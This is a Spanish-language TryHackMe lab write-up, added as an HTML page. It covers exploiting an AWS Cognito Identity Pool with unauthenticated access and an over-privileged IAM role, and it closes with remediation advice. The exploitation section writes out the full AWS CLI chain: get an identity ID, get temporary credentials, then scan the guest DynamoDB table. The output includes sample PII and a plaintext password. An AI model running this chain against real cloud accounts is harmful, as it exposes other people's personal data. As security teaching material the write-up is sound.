@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 3 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Cloud Security / AWS Misconfiguration</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">Critical</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-03</div>
+      </div>
+    </div>
+
+    <h1>Complimentary Wellness App — Acceso no autenticado a DynamoDB vía Cognito Identity Pool</h1>
+    <p class="dek">Se explotó una configuración insegura de AWS Cognito Identity Pool con acceso no autenticado habilitado. Las credenciales temporales obtenidas permitieron escanear una tabla DynamoDB completa, exfiltrando datos personales de otros huéspedes del resort, incluyendo contraseñas, emails, teléfonos y ubicaciones.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El objetivo era una aplicación web llamada "Byte Lotus Wellness", un dashboard de bienestar "gratuito" alojado en un bucket S3 como sitio estático. La app no requería cuenta ni login — según el briefing, el huésped Lambo la instaló el día que llegó al resort, atraída por las buenas reseñas y un tote bag de regalo por otorgar permisos de cámara, micrófono, contactos y ubicación.</p>
+    <p>Al acceder a la URL del dashboard, la app mostraba un mensaje genérico indicando que aún no tenía datos de wellness. El primer paso fue inspeccionar el código fuente del sitio para entender cómo la aplicación se comunicaba con el backend, dado que no existía proceso de autenticación visible.</p>
+    <pre><code># Acceso inicial al dashboard
+http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
+
+# Respuesta de la app:
+"Welcome! We don't have wellness data for you yet — check back after your first spa visit."</code></pre>
+    <p>Al inspeccionar el código JavaScript (<code>app.js</code>) en las herramientas de desarrollo del navegador, se encontraron credenciales de configuración AWS hardcodeadas directamente en el frontend:</p>
+    <pre><code>// Extraído de app.js (DevTools → Sources)
+const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
+const AWS_REGION = "us-east-1";
+const TABLE_NAME = "complimentary-GuestWellnessProfiles";
+
+AWS.config.region = AWS_REGION;
+AWS.config.credentials = new AWS.CognitoIdentityCredentials({
+    IdentityPoolId: IDENTITY_POOL_ID,
+});</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day3-devtools.png" alt="DevTools mostrando app.js con las credenciales de Cognito hardcodeadas">
+      <figcaption>Fig. 1 — Código fuente de app.js exponiendo el Identity Pool ID, la región y el nombre de la tabla DynamoDB.</figcaption>
+    </figure>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>La aplicación utilizaba un <strong>Amazon Cognito Identity Pool con acceso no autenticado habilitado</strong>. Esto significa que cualquier visitante, sin necesidad de registrarse ni iniciar sesión, podía obtener credenciales temporales de AWS con solo hacer una solicitud al servicio de Cognito.</p>
+    <p>El problema no era solo la existencia de acceso no autenticado (que tiene usos legítimos), sino que el <strong>rol IAM asociado al acceso no autenticado</strong> tenía permisos excesivos: podía ejecutar <code>dynamodb:Scan</code> sobre la tabla <code>complimentary-GuestWellnessProfiles</code>, lo que permitía leer <em>todos</em> los registros de todos los huéspedes, no solo el del usuario actual.</p>
+
+    <div class="callout"><strong>Nota:</strong> La cadena de ataque depende de tres errores encadenados: (1) credenciales de configuración expuestas en el frontend, (2) Identity Pool con acceso anónimo habilitado, y (3) rol IAM con permisos excesivos (Scan en lugar de GetItem restringido al propio registro). Cualquiera de los tres, corregido individualmente, habría roto la cadena.</div>
+
+    <h2>Explotación (PoC)</h2>
+    <p><strong>Paso 1 — Obtención de Identity ID.</strong> Con el Identity Pool ID extraído del JavaScript, se solicitó un identificador de identidad anónimo a Cognito:</p>
+    <pre><code>aws cognito-identity get-id \
+  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
+  --region us-east-1
+
+# Respuesta:
+{
+    "IdentityId": "us-east-1:4d571309-b08b-c910-5f3e-840bfee0a451"
+}</code></pre>
+
+    <p><strong>Paso 2 — Obtención de credenciales temporales.</strong> Con el Identity ID, se solicitaron credenciales temporales de AWS (AccessKeyId, SecretKey, SessionToken):</p>
+    <pre><code>aws cognito-identity get-credentials-for-identity \
+  --identity-id us-east-1:4d571309-b08b-c910-5f3e-840bfee0a451 \
+  --region us-east-1 > creds.json
+
+# Se exportaron las credenciales como variables de entorno:
+export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
+export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretKey' creds.json)
+export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)</code></pre>
+
+    <p><strong>Paso 3 — Verificación de identidad.</strong> Se confirmó el rol asumido con STS:</p>
+    <pre><code>aws sts get-caller-identity --region us-east-1
+
+{
+    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
+    "Account": "332173347248",
+    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
+}</code></pre>
+
+    <p><strong>Paso 4 — Escaneo de la tabla DynamoDB.</strong> Con las credenciales del rol no autenticado, se ejecutó un scan completo de la tabla de perfiles de huéspedes:</p>
+    <pre><code>aws dynamodb scan \
+  --table-name complimentary-GuestWellnessProfiles \
+  --region us-east-1</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day3-dynamodb-scan.png" alt="Resultado del scan de DynamoDB mostrando datos de huéspedes y la flag">
+      <figcaption>Fig. 2 — Scan de la tabla DynamoDB exponiendo datos personales del huésped y la flag del reto.</figcaption>
+    </figure>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>El scan de la tabla DynamoDB devolvió los registros completos de los huéspedes, incluyendo:</p>
+    <ul>
+      <li><strong>Datos personales:</strong> nombre, email (<code>vibe@hackerholidays.thm</code>), teléfono (<code>+1-555-0193</code>), ubicación GPS.</li>
+      <li><strong>Credenciales:</strong> contraseña en texto plano (<code>digitaldetox2026</code>).</li>
+      <li><strong>Notas internas:</strong> información sobre las preferencias y comportamiento del huésped.</li>
+      <li><strong>La flag del reto</strong>, contenida en el campo <code>name</code> del registro.</li>
+    </ul>
+    <p>El impacto es <em>critical</em>: un atacante sin autenticación alguna puede exfiltrar la totalidad de los datos personales de todos los huéspedes del resort. Esto incluye PII (información de identificación personal), credenciales en texto plano y datos de ubicación — todo accesible sin más que inspeccionar el JavaScript del frontend y ejecutar cuatro comandos de AWS CLI.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Deshabilitar acceso no autenticado en Cognito:</strong> si no es estrictamente necesario, eliminar el acceso anónimo del Identity Pool. Si se necesita, aplicar el principio de mínimo privilegio al rol asociado.</li>
+      <li><strong>Restringir permisos IAM:</strong> el rol no autenticado no debería tener <code>dynamodb:Scan</code>. Limitar a <code>dynamodb:GetItem</code> con condiciones que restrinjan el acceso exclusivamente al registro del propio usuario (usando <code>dynamodb:LeadingKeys</code>).</li>
+      <li><strong>No almacenar contraseñas en texto plano:</strong> utilizar hashing con salt (bcrypt, Argon2) para cualquier credencial almacenada en la base de datos.</li>
+      <li><strong>No exponer configuración sensible en el frontend:</strong> mover la lógica de acceso a datos a un backend con autenticación y autorización adecuadas. El frontend no debería interactuar directamente con DynamoDB.</li>
+      <li><strong>Implementar autenticación real:</strong> reemplazar el modelo de "no account needed" por un flujo de autenticación que vincule la identidad del usuario a su registro antes de permitir el acceso a datos personales.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto demuestra una cadena de ataque clásica en entornos cloud mal configurados: una aplicación serverless que confía en la seguridad por oscuridad (esconder las credenciales en el JavaScript del frontend) en lugar de implementar controles de acceso reales. El hecho de que todo esté en el código fuente del cliente — el Identity Pool ID, la región, el nombre de la tabla — convierte la "inspección del navegador" en la fase completa de reconocimiento.</p>
+    <p>La lección principal es que <strong>Cognito Identity Pools con acceso no autenticado son una superficie de ataque crítica</strong> si el rol IAM asociado no está estrictamente restringido. El servicio está diseñado para otorgar credenciales temporales a usuarios anónimos, lo cual es un feature, no un bug — pero el rol que reciben esas credenciales define el alcance del daño. Un <code>Scan</code> sobre una tabla con PII es el peor escenario posible para un rol anónimo.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
